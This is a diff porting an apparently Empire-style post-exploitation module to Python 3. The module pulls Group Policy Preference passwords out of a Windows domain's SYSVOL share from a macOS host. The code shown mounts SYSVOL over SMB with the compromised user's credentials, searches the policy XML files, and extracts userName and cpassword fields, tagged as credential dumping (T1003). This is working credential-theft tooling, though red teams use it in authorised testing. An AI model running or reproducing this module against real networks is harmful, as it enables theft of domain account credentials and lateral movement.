@@ -1,4 +1,5 @@
-class Module:
+from builtins import object
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,6 +13,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': 'This module will attempt to pull group policy preference passwords from SYSVOL',
+
+            'Software': '',
+
+            'Techniques': ['T1003'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -119,24 +124,24 @@ output.stdout.close()
 out,err = output2.communicate()
 
 
-print subprocess.Popen('mkdir /Volumes/sysvol', shell=True, stdout=subprocess.PIPE).stdout.read()
+print(subprocess.Popen('mkdir /Volumes/sysvol', shell=True, stdout=subprocess.PIPE).stdout.read())
 
 cmd = \"""mount_smbfs //'{};{}:{}'@{}/SYSVOL /Volumes/sysvol""\".format(ext,name,password,LDAPAddress)
-print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
-print "Searching for Passwords...This may take some time"
+print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+print("Searching for Passwords...This may take some time")
 xmls = subprocess.Popen('find /Volumes/sysvol -name *.xml', shell=True, stdout=subprocess.PIPE).stdout.read()
 cmd1 = \"""cat {}""\".format(xmls)
 result = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE).stdout.read()
-print ""
+print("")
 for usermatch in re.finditer(r'userName="(.*?)"|newName="(.*?)"|cpassword="(.*?)"', result, re.DOTALL):
-    print usermatch.group(0)
+    print(usermatch.group(0))
 
 
 
-print ""
-print subprocess.Popen('diskutil unmount force /Volumes/sysvol/', shell=True, stdout=subprocess.PIPE).stdout.read()
-print ""
-print "Finished"
+print("")
+print(subprocess.Popen('diskutil unmount force /Volumes/sysvol/', shell=True, stdout=subprocess.PIPE).stdout.read())
+print("")
+print("Finished")
 
 
 
